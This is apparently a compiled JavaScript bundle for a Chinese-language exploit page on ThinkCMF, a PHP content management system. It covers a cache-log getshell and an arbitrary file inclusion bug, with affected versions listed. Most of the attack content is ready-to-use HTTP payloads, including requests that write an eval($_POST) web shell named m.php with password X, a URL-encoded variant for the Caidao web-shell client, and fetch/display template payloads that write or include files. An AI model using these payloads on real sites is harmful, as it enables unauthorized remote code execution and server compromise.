(window.webpackJsonp=window.webpackJsonp||[]).push([[82],{807:function(a,t,e){"use strict";e.r(t);var s=e(103),n=Object(s.a)({},(function(){var a=this,t=a.$createElement,e=a._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[e("h2",{attrs:{id:"应用简介"}},[a._v("应用简介 "),e("a",{staticClass:"header-anchor",attrs:{href:"#应用简介"}},[a._v("#")])]),a._v(" "),e("p",[a._v("ThinkCMF是基于ThinkPHP框架开发的内容管理系统")]),a._v(" "),e("h2",{attrs:{id:"thinkcmf缓存getshell漏洞"}},[a._v("ThinkCMF缓存Getshell漏洞 "),e("a",{staticClass:"header-anchor",attrs:{href:"#thinkcmf缓存getshell漏洞"}},[a._v("#")])]),a._v(" "),e("p",[e("strong",[a._v("漏洞概述")])]),a._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[a._v("#影响范围\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[a._v("由于thinkcmf2.x使用了thinkphp3.x作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马m.php")]),a._v(" "),e("p",[a._v("日志文件格式为YY_MM_DD.log，如当前日期为2019年12月12日，日志文件为19_12_12.log，完整路径为")]),a._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v("data/runtime/Logs/Portal/19_12_12.log\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[e("strong",[a._v("漏洞利用")])]),a._v(" "),e("p",[a._v("Payload1：")]),a._v(" "),e("p",[a._v("首先访问")]),a._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("http:")]),a._v("//target.domain/?a=display&templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[a._v("然后请求")]),a._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("http:")]),a._v("//target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v("即可在\nhttp://xxx.com/根目录生成m.php，密码是X\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br"),e("span",{staticClass:"line-number"},[a._v("2")]),e("br")])]),e("p",[a._v("Payload2:")]),a._v(" "),e("p",[a._v("首先访问")]),a._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("http:")]),a._v("//target.domain/?a=display&templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[a._v("然后菜刀连接")]),a._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("http:")]),a._v("//target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[a._v("密码同样是X")]),a._v(" "),e("h2",{attrs:{id:"thinkcmf框架任意文件包含"}},[a._v("ThinkCMF框架任意文件包含 "),e("a",{staticClass:"header-anchor",attrs:{href:"#thinkcmf框架任意文件包含"}},[a._v("#")])]),a._v(" "),e("p",[e("strong",[a._v("影响版本")])]),a._v(" "),e("div",{staticClass:"language-http line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[a._v("ThinkCMF X1.6.0 \nThinkCMF X2.1.0\nThinkCMF X2.2.0 \nThinkCMF X2.2.1 \nThinkCMF X2.2.2 \nThinkCMF X2.2.3  \n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br"),e("span",{staticClass:"line-number"},[a._v("2")]),e("br"),e("span",{staticClass:"line-number"},[a._v("3")]),e("br"),e("span",{staticClass:"line-number"},[a._v("4")]),e("br"),e("span",{staticClass:"line-number"},[a._v("5")]),e("br"),e("span",{staticClass:"line-number"},[a._v("6")]),e("br")])]),e("p",[e("strong",[a._v("漏洞利用")])]),a._v(" "),e("p",[a._v("第一种：\n通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件phpinfo版payload")]),a._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v("?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[a._v("第二种：\n通过构造a参数的display方法，实现任意文件包含漏洞")]),a._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v("?a=display&templateFile=README.md\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])])])}),[],!1,null,null,null);t.default=n.exports}}]);